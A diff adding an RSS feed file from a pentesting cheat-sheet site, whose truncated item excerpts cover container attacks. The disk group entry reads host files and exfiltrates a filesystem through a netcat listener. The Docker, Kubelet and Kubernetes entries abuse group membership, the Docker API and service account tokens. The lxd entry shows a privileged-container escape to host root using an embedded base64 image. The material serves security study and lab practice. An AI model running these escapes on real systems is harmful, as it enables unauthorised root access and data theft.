@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Container on TLDRBins</title>
+    <link>https://tldrbins.github.io/@container/</link>
+    <description>Recent content in Container on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@container/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>disk group</title>
+      <link>https://tldrbins.github.io/disk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/disk/</guid>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.</description>
+    </item>
+    <item>
+      <title>Docker</title>
+      <link>https://tldrbins.github.io/docker/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker/</guid>
+      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) Explore Docker image dive&#xA;dive docker-archive://image.tar Abuse #1: Docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it &amp;lt;IMAGE_NAME&amp;gt; bash # Check ls /mnt/root Abuse #2: Docker API # Show running containers curl -s --unix-socket /var/run/docker.</description>
+    </item>
+    <item>
+      <title>Docker Registry</title>
+      <link>https://tldrbins.github.io/docker_registry/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker_registry/</guid>
+      <description> API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/blobs/sha256:&amp;lt;BLOB_HASH&amp;gt;&amp;#39; DockerRegistryGrabber DockerRegistryGrabber&#xA;# List repos python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --list # Dump repo python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --dump &amp;lt;REPO&amp;gt; </description>
+    </item>
+    <item>
+      <title>Kubelet</title>
+      <link>https://tldrbins.github.io/kubelet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kubelet/</guid>
+      <description> Tools kubeletctl&#xA;Basic Commands # List all the pods on the node kubeletctl pods -s 10.10.11.10 # List running pods kubeletctl runningpods -s 10.10.11.10 # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s 10.10.11.10 </description>
+    </item>
+    <item>
+      <title>Kubernetes</title>
+      <link>https://tldrbins.github.io/kubernetes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kubernetes/</guid>
+      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Tools kubectl&#xA;Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.</description>
+    </item>
+    <item>
+      <title>lxd</title>
+      <link>https://tldrbins.github.io/lxd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/lxd/</guid>
+      <description>Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Abuse #1: Mount host&amp;rsquo;s file system # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.</description>
+    </item>
+  </channel>
+</rss>
